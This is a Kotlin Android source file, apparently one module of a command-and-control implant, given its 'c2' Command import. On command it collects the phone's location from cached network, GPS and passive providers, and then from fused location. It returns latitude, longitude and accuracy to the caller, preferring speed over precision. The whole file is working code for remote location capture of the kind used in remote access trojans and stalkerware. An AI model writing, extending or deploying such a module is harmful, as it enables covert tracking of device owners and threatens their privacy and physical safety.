package org.synapse.core.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

object LocationModule {

    /**
     * Get device location with immediate-first strategy:
     * 1. getLastKnownLocation from all providers (IMMEDIATE, cached) — returns in <10ms
     * 2. FusedLocationProvider PRIORITY_BALANCED_POWER_ACCURACY (NETWORK) — 5s timeout
     * 3. FusedLocationProvider PRIORITY_HIGH_ACCURACY (GPS) — 5s timeout (only if cached > 5min old)
     *
     * Returns whatever is available — coarse network location is better than timeout.
     */
    suspend fun get(context: Context, cmd: Command): SynapseResponse {
        val hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        val hasCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)

        if (hasFine != PackageManager.PERMISSION_GRANTED &&
            hasCoarse != PackageManager.PERMISSION_GRANTED) {
            return SynapseResponse.ErrorResponse(error = "no_location_permission", module = "location")
        }

        var bestLocation: Location? = null
        var bestProvider = "none"
        val errors = mutableListOf<String>()

        // ── 1. getLastKnownLocation FIRST — IMMEDIATE (cache hit) ──
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // Try NETWORK_PROVIDER first (WiFi/cell tower — works indoors, always available)
        try {
            val netLast = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (netLast != null) {
                bestLocation = netLast
                bestProvider = "network_last"
                val ageSec = (System.currentTimeMillis() - netLast.time) / 1000
                if (ageSec < 300) {
                    // Network location is recent (<5min) — return immediately
                    return SynapseResponse.LocationResponse(
                        lat = netLast.latitude,
                        lng = netLast.longitude,
                        accuracy = netLast.accuracy,
                        provider = bestProvider
                    )
                }
                // Older than 5 min — keep it but continue trying for fresher
            }
        } catch (e: Exception) {
            errors.add("network_last:${e.message}")
        }

        // Try GPS last known
        if (hasFine == PackageManager.PERMISSION_GRANTED) {
            try {
                val gpsLast = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (gpsLast != null) {
                    val gpsAge = (System.currentTimeMillis() - gpsLast.time) / 1000
                    if (bestLocation == null || gpsLast.accuracy < bestLocation.accuracy ||
                        (bestLocation.time > 0 && gpsLast.time > bestLocation.time)) {
                        bestLocation = gpsLast
                        bestProvider = "gps_last"
                    }
                    if (gpsAge < 60) {
                        // GPS is recent (<1min) — return immediately
                        return SynapseResponse.LocationResponse(
                            lat = gpsLast.latitude,
                            lng = gpsLast.longitude,
                            accuracy = gpsLast.accuracy,
                            provider = bestProvider
                        )
                    }
                }
            } catch (e: Exception) {
                errors.add("gps_last:${e.message}")
            }
        }

        // Try PASSIVE provider (any app's cached location)
        if (bestLocation == null) {
            try {
                val passiveLast = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
                if (passiveLast != null) {
                    bestLocation = passiveLast
                    bestProvider = "passive_last"
                    // Return immediately if we have anything — coarse is better than timeout
                    return SynapseResponse.LocationResponse(
                        lat = passiveLast.latitude,
                        lng = passiveLast.longitude,
                        accuracy = passiveLast.accuracy,
                        provider = bestProvider
                    )
                }
            } catch (e: Exception) {
                errors.add("passive_last:${e.message}")
            }
        }

        // ── 2. Try FusedLocationProvider with BALANCED (NETWORK) — 5s timeout ──
        val ageSec = if (bestLocation != null) (System.currentTimeMillis() - bestLocation.time) / 1000 else 999
        val needsFresh = (bestLocation == null || ageSec > 300) // older than 5 min

        if (needsFresh) {
            try {
                val client = LocationServices.getFusedLocationProviderClient(context)

                // Try NETWORK first (fast, works indoors)
                val netLocation = withTimeoutOrNull(5_000L) {
                    suspendCancellableCoroutine<Location?> { cont ->
                        client.getCurrentLocation(
                            Priority.PRIORITY_BALANCED_POWER_ACCURACY, null
                        ).addOnSuccessListener { loc ->
                            cont.resume(loc)
                        }.addOnFailureListener { e ->
                            errors.add("fused_network:${e.message}")
                            cont.resume(null)
                        }
                    }
                }

                if (netLocation != null) {
                    bestLocation = netLocation
                    bestProvider = netLocation.provider ?: "fused_balanced"
                    // Return immediately — network location is good enough
                    return SynapseResponse.LocationResponse(
                        lat = netLocation.latitude,
                        lng = netLocation.longitude,
                        accuracy = netLocation.accuracy,
                        provider = bestProvider
                    )
                }

                // GPS only if we really need it (no cached location and network failed)
                if (bestLocation == null && hasFine == PackageManager.PERMISSION_GRANTED) {
                    val gpsLocation = withTimeoutOrNull(5_000L) {
                        suspendCancellableCoroutine<Location?> { cont ->
                            client.getCurrentLocation(
                                Priority.PRIORITY_HIGH_ACCURACY, null
                            ).addOnSuccessListener { loc ->
                                cont.resume(loc)
                            }.addOnFailureListener { e ->
                                errors.add("fused_gps:${e.message}")
                                cont.resume(null)
                            }
                        }
                    }
                    if (gpsLocation != null) {
                        bestLocation = gpsLocation
                        bestProvider = gpsLocation.provider ?: "fused_gps"
                    }
                }
            } catch (e: Exception) {
                errors.add("fused:${e.message}")
            }
        }

        // ── Return best available location ──
        if (bestLocation != null) {
            return SynapseResponse.LocationResponse(
                lat = bestLocation.latitude,
                lng = bestLocation.longitude,
                accuracy = bestLocation.accuracy,
                provider = bestProvider
            )
        }

        val detail = if (errors.isNotEmpty()) errors.joinToString("; ") else "all providers exhausted"
        return SynapseResponse.ErrorResponse(error = "location_timeout:$detail", module = "location")
    }
}
